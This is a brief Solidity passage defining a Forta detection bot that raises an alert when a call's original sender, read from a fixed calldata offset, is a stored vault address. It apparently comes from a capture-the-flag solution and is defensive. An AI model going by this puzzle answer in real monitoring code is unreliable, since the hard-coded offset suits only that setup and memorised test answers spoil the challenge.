}

contract FortaDetectionBot {
    address private cryptoVault;

    constructor(address _cryptoVault) {
        cryptoVault = _cryptoVault;
    }

    function handleTransaction(address user, bytes calldata msgData) external {
        // Extract the address of original message sender
        // which should start at offset 168 (0xa8) of calldata
        address origSender;
        assembly {
            origSender := calldataload(0xa8)
        }

        if (origSender == cryptoVault) {
            IForta(msg.sender).raiseAlert(user);
        }
    }
}
```
